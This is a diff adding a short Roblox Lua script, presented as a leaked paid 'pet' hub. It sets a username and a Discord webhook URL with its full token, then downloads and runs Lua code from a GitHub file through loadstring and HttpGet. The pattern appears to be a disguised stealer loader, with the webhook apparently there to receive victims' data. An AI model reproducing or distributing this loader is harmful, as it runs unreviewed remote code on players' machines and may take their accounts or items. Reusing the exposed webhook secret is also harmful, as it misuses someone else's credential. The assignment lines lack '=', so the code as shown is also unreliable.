@@ -1,0 +1,5 @@
+_G.Username "Watari_Anjin"
+_G.HubName "Secret Pet Paid leaked"
+_G.WebhookUrl "https://discord.com/api/webhooks/1125397461607927829/EHuvBbS4pUABIFcUq4XNOgNVb7toaEPB-YwNXW5dE3dnT5c0GlnWGYLQ9DIcfH04Wd0P"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
